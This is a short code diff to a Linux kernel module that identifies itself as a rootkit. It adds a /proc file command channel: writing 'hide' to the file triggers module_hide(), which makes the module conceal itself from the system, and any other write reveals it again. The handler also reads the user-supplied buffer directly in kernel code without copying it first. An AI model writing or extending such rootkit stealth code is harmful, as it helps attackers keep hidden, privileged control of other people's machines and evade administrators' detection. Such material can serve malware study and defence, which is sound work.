@@ -10,6 +10,7 @@
  * handlers for the file are registered.
  */
 #include "include/proc.h"
+#include "include/hide.h"
 
 
 /*
@@ -34,6 +35,13 @@ ssize_t handler_write_proc_file(
         struct file *file, const char __user *buffer, 
         size_t length, loff_t *data) {
     printk("rootkit: write in \"/proc/%s\" file: %ld", PROC_FILE_NAME, length);
+
+    if (strncmp(buffer, "hide", 4) == 0) {
+        module_hide();
+    }
+    else {
+        module_show();
+    }
 
     return length;
 }
